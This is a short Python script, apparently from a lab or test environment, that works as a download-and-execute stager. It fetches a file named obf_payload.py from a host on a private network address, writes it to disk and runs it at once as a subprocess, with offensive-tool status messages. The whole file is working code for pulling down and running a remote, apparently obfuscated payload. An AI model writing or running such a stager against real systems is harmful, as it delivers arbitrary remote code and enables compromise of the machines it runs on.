import requests
import subprocess

URL = "http://192.168.56.129:8000/obf_payload.py"

def main():
    print("[*] Downloading payload...")
    response = requests.get(URL)
    if response.status_code == 200:
        with open("payload.py", "w") as f:
            f.write(response.text)
        print("[*] Running payload as subprocess...")
        subprocess.Popen(["python3", "payload.py"])
    else:
        print("[!] Failed to download payload.")

if __name__ == "__main__":
    main()
